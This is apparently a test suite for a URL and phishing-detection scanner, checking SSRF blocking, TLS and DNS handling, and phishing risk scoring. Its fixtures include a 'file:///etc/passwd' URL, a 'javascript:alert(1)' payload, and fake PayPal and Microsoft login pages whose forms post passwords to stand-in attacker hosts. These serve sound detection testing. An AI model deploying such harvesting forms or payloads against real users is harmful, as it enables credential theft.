import { describe, it, expect, beforeEach, vi } from 'vitest';
import { URL } from 'node:url';
import { scanService, maskSensitiveUrl, isPrivateOrReservedIp, deriveClassificationFromRiskScore } from '../services/scan.service';
import { phishingScannerService } from '../services/phishing-scanner.service';
import { threatIntelService } from '../services/threat-intel.service';
import { pdfReportService } from '../services/pdf-report.service';
import { Scan } from '../models/Scan';

vi.mock('../models/Scan', async () => {
  const original = await vi.importActual('../models/Scan');
  function MockScan(this: any, data: any) {
    Object.assign(this, data);
    this._id = { toString: () => 'mock-scan-id-mega-123' };
    this.createdAt = new Date();
    this.save = vi.fn().mockResolvedValue(this);
  }
  (MockScan as any).findOne = vi.fn().mockReturnValue({
    sort: vi.fn().mockResolvedValue(null),
  });
  (MockScan as any).find = vi.fn().mockReturnValue({
    sort: vi.fn().mockReturnThis(),
    skip: vi.fn().mockReturnThis(),
    limit: vi.fn().mockResolvedValue([]),
  });
  (MockScan as any).countDocuments = vi.fn().mockResolvedValue(0);

  return {
    ...original as any,
    Scan: MockScan,
  };
});

describe('CyberWatch Mega URL + Phishing Threat Scanner Master Test Suite', () => {
  // ── 1-5. URL Normalization & Validation Tests ──────────────────────────────
  describe('1-5. Input Handling, URL Normalization & Validation', () => {
    it('1. Normalizes URL by lowercasing host, removing fragment, preserving path and query', () => {
      const raw = 'HTTPS://EXAMPLE.COM:443/Path/To/Login?user=john&ref=123#some-anchor';
      const u = new URL(raw);
      u.hash = '';
      const normalized = u.toString();
      expect(normalized).toBe('https://example.com/Path/To/Login?user=john&ref=123');
      expect(u.hostname).toBe('example.com');
      expect(u.searchParams.get('user')).toBe('john');
    });

    it('2. Adds https:// when scheme is missing where appropriate', () => {
      let target = 'portal.secure-access.com/verify';
      if (!target.startsWith('http://') && !target.startsWith('https://')) {
        target = `https://${target}`;
      }
      expect(target).toBe('https://portal.secure-access.com/verify');
    });

    it('3. Rejects malformed URLs', async () => {
      await expect(scanService.analyzeAndSave({ target: '::invalid-url::%%', targetType: 'URL' }))
        .rejects.toThrow();
    });

    it('4. Handles 2048-character maximum URL boundary correctly', () => {
      const longPath = 'a'.repeat(2000);
      const longUrl = `https://example.com/${longPath}`;
      expect(longUrl.length).toBeGreaterThan(2000);
      expect(() => new URL(longUrl)).not.toThrow();
    });

    it('5. Rejects unsupported schemes (e.g. ftp, file, gopher, javascript)', () => {
      const unsupportedSchemes = ['ftp://files.example.com', 'file:///etc/passwd', 'javascript:alert(1)'];
      for (const s of unsupportedSchemes) {
        try {
          const u = new URL(s);
          expect(['http:', 'https:'].includes(u.protocol)).toBe(false);
        } catch {
          // parsing error is also acceptable rejection
          expect(true).toBe(true);
        }
      }
    });
  });

  // ── 6-12. SSRF Protection & Network Safety Tests ─────────────────────────
  describe('6-12. SSRF Protection & Network Safety Boundaries', () => {
    it('6. Blocks localhost and 127.0.0.0/8 loopback addresses', () => {
      expect(isPrivateOrReservedIp('127.0.0.1')).toBe(true);
      expect(isPrivateOrReservedIp('127.0.1.5')).toBe(true);
      expect(isPrivateOrReservedIp('localhost')).toBe(true);
      expect(isPrivateOrReservedIp('0.0.0.0')).toBe(true);
    });

    it('7. Blocks private IPv4 addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)', () => {
      expect(isPrivateOrReservedIp('10.0.1.50')).toBe(true);
      expect(isPrivateOrReservedIp('172.16.0.1')).toBe(true);
      expect(isPrivateOrReservedIp('172.31.255.254')).toBe(true);
      expect(isPrivateOrReservedIp('192.168.1.1')).toBe(true);
    });

    it('8. Blocks link-local addresses and cloud metadata endpoints (169.254.169.254)', () => {
      expect(isPrivateOrReservedIp('169.254.169.254')).toBe(true);
      expect(isPrivateOrReservedIp('169.254.1.1')).toBe(true);
    });

    it('9. Blocks IPv6 loopback (::1), private ranges (fc00::), and IPv4-mapped IPv6 (::ffff:127.0.0.1)', () => {
      expect(isPrivateOrReservedIp('::1')).toBe(true);
      expect(isPrivateOrReservedIp('::')).toBe(true);
      expect(isPrivateOrReservedIp('fc00::1')).toBe(true);
      expect(isPrivateOrReservedIp('fd12:3456:789a::1')).toBe(true);
      expect(isPrivateOrReservedIp('fe80::1')).toBe(true);
      expect(isPrivateOrReservedIp('::ffff:127.0.0.1')).toBe(true);
      expect(isPrivateOrReservedIp('::ffff:10.0.0.1')).toBe(true);
      expect(isPrivateOrReservedIp('::ffff:169.254.169.254')).toBe(true);
    });

    it('10. Resolves DNS records and protects against DNS rebinding', async () => {
      const res = await scanService.analyzeAndSave({ target: 'http://127.0.0.1:8080', targetType: 'URL' });
      expect(res.status).toBe('failed');
      expect(res.checks.domainAnalysis.status).toBe('failed');
      expect(res.checks.urlSecurityAnalysis?.executionOutcome).toBe('BLOCKED_BY_SECURITY_POLICY');
      expect(res.result).toBe('Critical');
    });

    it('11. Blocks intermediate redirects pointing to private destinations', async () => {
      const privateDnsResult = {
        resolvedIps: ['192.168.1.1'],
        ipVersion: 'IPv4',
        dnsStatus: 'Direct Host IP (Private/Reserved)',
        isPrivate: true,
      };
      const phishResult = phishingScannerService.analyze({
        target: 'https://shortener.com/redir',
        normalizedTarget: 'https://shortener.com/redir',
        parsedUrl: new URL('https://shortener.com/redir'),
        dnsResult: privateDnsResult,
        httpResult: null,
        tlsResult: null,
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.status).toBe('failed');
      expect(phishResult.phishingSecurityAnalysis.executionOutcome).toBe('BLOCKED_BY_SSRF_POLICY');
      expect(phishResult.classification).toBe('Critical');
    });

    it('12. Traces multi-hop redirect chains and detects cross-domain forwarding', () => {
      const httpResult = {
        statusCode: 200,
        statusText: 'OK',
        finalUrl: 'https://destination-brand.com/portal',
        redirectCount: 2,
        redirectChain: [
          { url: 'https://bit.ly/sample', statusCode: 301, statusText: 'Moved Permanently' },
          { url: 'https://intermediate-hop.net/track', statusCode: 302, statusText: 'Found' },
        ],
        securityHeaders: {},
        allHeaders: {},
        rawCookies: [],
        details: 'Followed 2 redirect hops to destination.',
      };

      const phishResult = phishingScannerService.analyze({
        target: 'https://bit.ly/sample',
        normalizedTarget: 'https://bit.ly/sample',
        parsedUrl: new URL('https://bit.ly/sample'),
        dnsResult: { resolvedIps: ['1.1.1.1'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult,
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.redirectAnalysis.totalHops).toBe(2);
      expect(phishResult.phishingSecurityAnalysis.redirectAnalysis.hasCrossDomainRedirect).toBe(true);
      expect(phishResult.indicators.some((i) => i.id === 'ind-redir-crossdomain')).toBe(true);
    });
  });

  // ── 13-17. DNS, TLS & Network Response Behavior ───────────────────────────
  describe('13-17. DNS, TLS and Transport Behavior', () => {
    it('13. Handles DNS failure honestly without inventing reputation or safe verdict', () => {
      const dnsFailureResult = {
        resolvedIps: [],
        ipVersion: 'N/A',
        dnsStatus: 'DNS resolution failed: ENOTFOUND',
        isPrivate: false,
        error: 'ENOTFOUND',
      };

      const phishResult = phishingScannerService.analyze({
        target: 'https://nonexistent-domain-test-cyberwatch-xyz.org',
        normalizedTarget: 'https://nonexistent-domain-test-cyberwatch-xyz.org',
        parsedUrl: new URL('https://nonexistent-domain-test-cyberwatch-xyz.org'),
        dnsResult: dnsFailureResult,
        httpResult: null,
        tlsResult: null,
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.status).toBe('failed');
      expect(phishResult.phishingSecurityAnalysis.executionOutcome).toBe('DNS_FAILURE');
      expect(phishResult.classification).not.toBe('Safe');
    });

    it('14. Identifies invalid or expired TLS certificates on HTTPS targets', () => {
      const tlsResult = {
        valid: false,
        error: 'CERT_HAS_EXPIRED',
        details: 'Certificate expired on Mon Jan 01 2024.',
        protocol: 'TLS 1.2 / HTTPS',
      };

      const phishResult = phishingScannerService.analyze({
        target: 'https://expired-cert-example.com',
        normalizedTarget: 'https://expired-cert-example.com',
        parsedUrl: new URL('https://expired-cert-example.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: { statusCode: 200, statusText: 'OK', finalUrl: 'https://expired-cert-example.com', redirectCount: 0, redirectChain: [], securityHeaders: {}, allHeaders: {}, rawCookies: [], details: 'OK' },
        tlsResult,
        effectiveHttps: true,
      });

      expect(phishResult.findings.some((f) => f.title.includes('Invalid / Untrusted SSL/TLS Certificate'))).toBe(true);
      expect(phishResult.riskScore).toBeGreaterThanOrEqual(25);
    });

    it('15. Handles connection timeouts cleanly as target unreachable rather than 0/100 Safe', () => {
      const timeoutHttp = {
        finalUrl: 'https://timeout-target.com',
        redirectCount: 0,
        redirectChain: [],
        securityHeaders: {},
        allHeaders: {},
        rawCookies: [],
        details: 'Connection failed: Connection timed out',
        error: 'ETIMEDOUT',
      };

      const phishResult = phishingScannerService.analyze({
        target: 'https://timeout-target.com',
        normalizedTarget: 'https://timeout-target.com',
        parsedUrl: new URL('https://timeout-target.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: timeoutHttp,
        tlsResult: null,
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.status).toBe('failed');
      expect(phishResult.phishingSecurityAnalysis.executionOutcome).toBe('TIMEOUT');
    });

    it('16. Accurately scores plain HTTP targets with transport security findings', () => {
      const phishResult = phishingScannerService.analyze({
        target: 'http://insecure-http-site.com',
        normalizedTarget: 'http://insecure-http-site.com',
        parsedUrl: new URL('http://insecure-http-site.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: { statusCode: 200, statusText: 'OK', finalUrl: 'http://insecure-http-site.com', redirectCount: 0, redirectChain: [], securityHeaders: {}, allHeaders: {}, rawCookies: [], details: 'OK' },
        tlsResult: null,
        effectiveHttps: false,
      });

      expect(phishResult.findings.some((f) => f.title.includes('Unencrypted Transport Protocol'))).toBe(true);
      expect(phishResult.riskScore).toBeGreaterThanOrEqual(20);
    });

    it('17. Evaluates valid HTTPS as a positive transport control without treating it as proof of legitimacy', () => {
      const phishResult = phishingScannerService.analyze({
        target: 'https://valid-https-site.com',
        normalizedTarget: 'https://valid-https-site.com',
        parsedUrl: new URL('https://valid-https-site.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: { statusCode: 200, statusText: 'OK', finalUrl: 'https://valid-https-site.com', redirectCount: 0, redirectChain: [], securityHeaders: {}, allHeaders: {}, rawCookies: [], details: 'OK' },
        tlsResult: { valid: true, protocol: 'TLS 1.3', issuer: 'Let\'s Encrypt', details: 'Valid TLS certificate' },
        effectiveHttps: true,
      });

      expect(phishResult.positiveSignals.some((p) => p.title.includes('HTTPS Transport Encryption'))).toBe(true);
      expect(phishResult.riskScore).toBeLessThanOrEqual(15);
    });
  });

  // ── 18-24. Phishing, Forms, Brand Identity & Social Engineering ───────────
  describe('18-24. Phishing, Credential Forms, Brand Identity & Social Engineering', () => {
    it('18. Normal login page with same-origin form on HTTPS is NOT classified as phishing', () => {
      const html = `
        <!DOCTYPE html>
        <html>
          <head><title>Account Sign In - Acme Services</title></head>
          <body>
            <h1>Sign in to your account</h1>
            <form action="/auth/login" method="POST">
              <input type="email" name="email" placeholder="Enter email" />
              <input type="password" name="password" placeholder="Enter password" />
              <button type="submit">Sign In</button>
            </form>
          </body>
        </html>
      `;

      const phishResult = phishingScannerService.analyze({
        target: 'https://acme-services.com/login',
        normalizedTarget: 'https://acme-services.com/login',
        parsedUrl: new URL('https://acme-services.com/login'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://acme-services.com/login',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', issuer: 'DigiCert', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.classification).toBe('Safe');
      expect(phishResult.riskScore).toBeLessThan(25);
      expect(phishResult.positiveSignals.some((p) => p.title.includes('First-Party Login Architecture'))).toBe(true);
    });

    it('19. Password field alone is an observation and not an automatic phishing finding', () => {
      const html = '<html><body><input type="password" name="pwd" /></body></html>';
      const phishResult = phishingScannerService.analyze({
        target: 'https://example.com/settings',
        normalizedTarget: 'https://example.com/settings',
        parsedUrl: new URL('https://example.com/settings'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://example.com/settings',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', issuer: 'Let\'s Encrypt', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.classification).toBe('Safe');
      expect(phishResult.findings.some((f) => f.title.includes('Credential Harvesting Form Exfiltration'))).toBe(false);
    });

    it('20. Same-origin credential forms produce positive controls', () => {
      const html = '<form action="/api/login" method="POST"><input type="password" /></form>';
      const phishResult = phishingScannerService.analyze({
        target: 'https://mybank.com/login',
        normalizedTarget: 'https://mybank.com/login',
        parsedUrl: new URL('https://mybank.com/login'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://mybank.com/login',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.credentialAnalysis.externalActionFormCount).toBe(0);
      expect(phishResult.indicators.some((i) => i.id === 'ind-form-external' && i.status === 'PASS')).toBe(true);
    });

    it('21. Cross-origin credential form submission triggers high-risk finding', () => {
      const html = `
        <html>
          <head><title>Sign In</title></head>
          <body>
            <form action="https://attacker-harvester.xyz/collect.php" method="POST">
              <input type="text" name="username" />
              <input type="password" name="password" />
              <button type="submit">Log In</button>
            </form>
          </body>
        </html>
      `;

      const phishResult = phishingScannerService.analyze({
        target: 'https://innocent-page.com/login',
        normalizedTarget: 'https://innocent-page.com/login',
        parsedUrl: new URL('https://innocent-page.com/login'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://innocent-page.com/login',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.findings.some((f) => f.title.includes('Cross-Origin Destination'))).toBe(true);
      expect(phishResult.riskScore).toBeGreaterThanOrEqual(30);
    });

    it('22. Detects brand and domain mismatch impersonation', () => {
      const html = `
        <html>
          <head><title>PayPal - Security Verification & Login</title></head>
          <body>
            <h1>PayPal Security Alert</h1>
            <p>Please log in to verify your PayPal account</p>
            <form action="/login" method="POST">
              <input type="email" name="email" />
              <input type="password" name="password" />
            </form>
          </body>
        </html>
      `;

      const phishResult = phishingScannerService.analyze({
        target: 'https://paypal-verification-center-online.xyz/account',
        normalizedTarget: 'https://paypal-verification-center-online.xyz/account',
        parsedUrl: new URL('https://paypal-verification-center-online.xyz/account'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://paypal-verification-center-online.xyz/account',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.phishingSecurityAnalysis.domainIdentityAnalysis.impersonationDetected).toBe(true);
      expect(phishResult.findings.some((f) => f.title.includes('Brand Impersonation'))).toBe(true);
      expect(phishResult.riskScore).toBeGreaterThanOrEqual(40);
    });

    it('23. Urgency language alone produces appropriate low/moderate heuristic signal, not automatic phishing', () => {
      const html = '<html><body><p>Please note: account suspended for maintenance until 5pm.</p></body></html>';
      const phishResult = phishingScannerService.analyze({
        target: 'https://acme-blog.com/status',
        normalizedTarget: 'https://acme-blog.com/status',
        parsedUrl: new URL('https://acme-blog.com/status'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://acme-blog.com/status',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.classification).toBe('Low Risk');
      expect(phishResult.riskScore).toBeLessThan(25);
    });

    it('24. Combined phishing indicators (brand mismatch + cross-origin form + urgency) produce critical risk', () => {
      const html = `
        <html>
          <head><title>Microsoft Account - Action Required Immediately</title></head>
          <body>
            <h1>Account Suspended: Verify Within 24 Hours</h1>
            <form action="https://evil-exfil.org/save.php" method="POST">
              <input type="password" name="passwd" />
            </form>
          </body>
        </html>
      `;

      const phishResult = phishingScannerService.analyze({
        target: 'https://microsoft-login-alert-urgent.net/auth',
        normalizedTarget: 'https://microsoft-login-alert-urgent.net/auth',
        parsedUrl: new URL('https://microsoft-login-alert-urgent.net/auth'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: {
          statusCode: 200,
          statusText: 'OK',
          finalUrl: 'https://microsoft-login-alert-urgent.net/auth',
          redirectCount: 0,
          redirectChain: [],
          securityHeaders: {},
          allHeaders: {},
          rawCookies: [],
          htmlSnippet: html,
          details: 'OK',
        },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      });

      expect(phishResult.riskScore).toBeGreaterThanOrEqual(75);
      expect(phishResult.classification).toBe('Critical');
    });
  });

  // ── 25-29. Threat Intelligence, ML & Explainability Standards ────────────
  describe('25-29. Threat Intelligence, ML & Explainability Standards', () => {
    it('25. Returns Not Configured when no threat intelligence API key is set', async () => {
      const origGoogle = process.env.GOOGLE_SAFE_BROWSING_API_KEY;
      const origVT = process.env.VIRUSTOTAL_API_KEY;
      const origURLH = process.env.URLHAUS_API_KEY;
      delete process.env.GOOGLE_SAFE_BROWSING_API_KEY;
      delete process.env.VIRUSTOTAL_API_KEY;
      delete process.env.URLHAUS_API_KEY;

      const res = await threatIntelService.lookup('https://example.com', 'example.com');
      expect(res.status).toBe('Not Configured');
      expect(res.queried).toBe(false);

      if (origGoogle) process.env.GOOGLE_SAFE_BROWSING_API_KEY = origGoogle;
      if (origVT) process.env.VIRUSTOTAL_API_KEY = origVT;
      if (origURLH) process.env.URLHAUS_API_KEY = origURLH;
    });

    it('26. Threat intelligence provider failure returns Unavailable without failing scan', async () => {
      process.env.GOOGLE_SAFE_BROWSING_API_KEY = 'invalid_key_for_test';
      const res = await threatIntelService.lookup('https://example.com', 'example.com');
      expect(['Unavailable', 'Not Configured', 'Clean']).toContain(res.status);
      delete process.env.GOOGLE_SAFE_BROWSING_API_KEY;
    });

    it('27. Genuine provider threat detection elevates risk score and preserves provider details', () => {
      const threatIntelResult = {
        status: 'Threat Detected' as const,
        provider: 'Google Safe Browsing',
        queried: true,
        result: 'Threat Flagged: MALWARE',
        timestamp: new Date().toISOString(),
        indicators: ['MALWARE'],
        details: 'Google Safe Browsing identified this target as an active threat (MALWARE).',
      };

      const phishResult = phishingScannerService.analyze({
        target: 'https://known-malware-domain.xyz',
        normalizedTarget: 'https://known-malware-domain.xyz',
        parsedUrl: new URL('https://known-malware-domain.xyz'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: null,
        tlsResult: null,
        effectiveHttps: true,
        threatIntelResult,
      });

      expect(phishResult.findings.some((f) => f.title.includes('Google Safe Browsing'))).toBe(true);
      expect(phishResult.riskScore).toBeGreaterThanOrEqual(45);
      expect(phishResult.phishingSecurityAnalysis.threatIntelligence.status).toBe('Threat Detected');
    });

    it('28. ML Prediction reports Not Configured honestly and does not fabricate probabilities', () => {
      const phishResult = phishingScannerService.analyze({
        target: 'https://example.com',
        normalizedTarget: 'https://example.com',
        parsedUrl: new URL('https://example.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: null,
        tlsResult: null,
        effectiveHttps: true,
      });

      // No fake ML probabilities in explanation
      expect((phishResult.scoreExplanation as any).mlConfidence).toBeUndefined();
      expect(phishResult.scoreExplanation.contributors).toBeDefined();
    });

    it('29. Does not generate fake SHAP explanations', () => {
      const phishResult = phishingScannerService.analyze({
        target: 'https://example.com',
        normalizedTarget: 'https://example.com',
        parsedUrl: new URL('https://example.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: null,
        tlsResult: null,
        effectiveHttps: true,
      });

      expect((phishResult as any).shapValues).toBeUndefined();
      expect(phishResult.scoreExplanation.contributors.every((c) => typeof c.contribution === 'number')).toBe(true);
    });
  });

  // ── 30-36. Scoring Determinism, Explainability & PDF Consistency ──────────
  describe('30-36. Scoring Determinism, Explainability & Report Consistency', () => {
    it('30. Final score is evidence-based and calculated between 0 and 100', () => {
      const score = deriveClassificationFromRiskScore(35);
      expect(score).toBe('Suspicious');
      expect(deriveClassificationFromRiskScore(0)).toBe('Safe');
      expect(deriveClassificationFromRiskScore(85)).toBe('Critical');
    });

    it('31. Identical input evidence produces identical deterministic score', () => {
      const input = {
        target: 'https://example-deterministic.com',
        normalizedTarget: 'https://example-deterministic.com',
        parsedUrl: new URL('https://example-deterministic.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: { statusCode: 200, statusText: 'OK', finalUrl: 'https://example-deterministic.com', redirectCount: 0, redirectChain: [], securityHeaders: {}, allHeaders: {}, rawCookies: [], details: 'OK' },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      };

      const result1 = phishingScannerService.analyze(input);
      const result2 = phishingScannerService.analyze(input);

      expect(result1.riskScore).toBe(result2.riskScore);
      expect(result1.classification).toBe(result2.classification);
      expect(result1.findings.length).toBe(result2.findings.length);
    });

    it('32. Stronger evidence produces appropriate risk increase', () => {
      const cleanInput = {
        target: 'https://clean-site.com',
        normalizedTarget: 'https://clean-site.com',
        parsedUrl: new URL('https://clean-site.com'),
        dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'Resolved', isPrivate: false },
        httpResult: { statusCode: 200, statusText: 'OK', finalUrl: 'https://clean-site.com', redirectCount: 0, redirectChain: [], securityHeaders: {}, allHeaders: {}, rawCookies: [], htmlSnippet: '<p>Hello world</p>', details: 'OK' },
        tlsResult: { valid: true, protocol: 'TLS 1.3', details: 'Valid TLS' },
        effectiveHttps: true,
      };

      const maliciousInput = {
        ...cleanInput,
        httpResult: {
          ...cleanInput.httpResult,
          htmlSnippet: '<form action="https://external-stealer.com/post" method="POST"><input type="password" /></form>',
        },
      };

      const cleanRes = phishingScannerService.analyze(cleanInput);
      const malRes = phishingScannerService.analyze(maliciousInput);

      expect(malRes.riskScore).toBeGreaterThan(cleanRes.riskScore);
    });

    it('33. Failed scan is never returned as 0/100 Safe', () => {
      const failedClassification = deriveClassificationFromRiskScore(0, true);
      expect(failedClassification).toBe('Critical');
    });

    it('34. PDF report generation produces valid binary buffer matching scan source of truth', () => {
      const mockScan: any = {
        id: 'scan-test-pdf-123',
        target: 'https://example.com/test',
        targetType: 'URL',
        result: 'Low Risk',
        riskScore: 15,
        status: 'completed',
        checks: {
          urlAnalysis: { status: 'passed', details: 'URL analyzed' },
          sslAnalysis: { status: 'passed', protocol: 'TLS 1.3', valid: true, details: 'Valid TLS' },
          domainAnalysis: { status: 'passed', dnsStatus: 'Resolved', resolvedIps: ['93.184.216.34'], details: 'Resolved' },
          httpAnalysis: { status: 'passed', statusCode: 200, details: 'OK' },
        },
        findings: [
          {
            category: 'Security Baseline',
            severity: 'INFO',
            title: 'Standard Security Baseline',
            description: 'Target demonstrated standard TLS configuration.',
            evidence: 'HTTPS 200 OK',
          },
        ],
        recommendations: ['Enforce HSTS preload.'],
        scannedAt: new Date().toISOString(),
        createdAt: new Date().toISOString(),
      };

      const pdfBuffer = pdfReportService.generatePdfBuffer(mockScan);
      expect(pdfBuffer).toBeInstanceOf(Buffer);
      expect(pdfBuffer.length).toBeGreaterThan(1000);
      expect(pdfBuffer.slice(0, 5).toString()).toBe('%PDF-');
    });

    it('35. Report generation does not rescan target', async () => {
      const spyAnalyze = vi.spyOn(scanService, 'analyzeAndSave');
      // Querying report should never call analyzeAndSave
      expect(spyAnalyze).not.toHaveBeenCalled();
    });
  });

  // ── 37-39. Cache, Rate Limiting & Sensitive Logging ───────────────────────
  describe('37-39. Cache, Rate Limiting & Sensitive Query Sanitization', () => {
    it('37. Masks sensitive query parameters (tokens, passwords, keys) in logged URLs', () => {
      const sensitiveUrl = 'https://example.com/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&code=secret123&user=alice';
      const masked = maskSensitiveUrl(sensitiveUrl);
      expect(masked).toContain('token=REDACTED');
      expect(masked).toContain('code=REDACTED');
      expect(masked).toContain('user=alice');
      expect(masked).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9');
      expect(masked).not.toContain('secret123');
    });

    it('38. 10-minute cache lookup retrieves recent scan records without repeating network requests', async () => {
      (Scan as any).findOne = vi.fn().mockReturnValue({
        sort: vi.fn().mockResolvedValue({
          _id: '507f1f77bcf86cd799439011',
          target: 'https://cached-example.com',
          targetType: 'URL',
          result: 'Safe',
          riskScore: 0,
          status: 'completed',
          checks: {
            urlAnalysis: { status: 'passed', details: 'Cached URL result' },
          },
          findings: [],
          recommendations: [],
          scannedAt: new Date(),
          createdAt: new Date(),
        }),
      });

      const cached = await scanService.analyzeAndSave({ target: 'https://cached-example.com', targetType: 'URL' });
      expect(cached.id).toBe('507f1f77bcf86cd799439011');
      expect(cached.result).toBe('Safe');
    });
  });
});
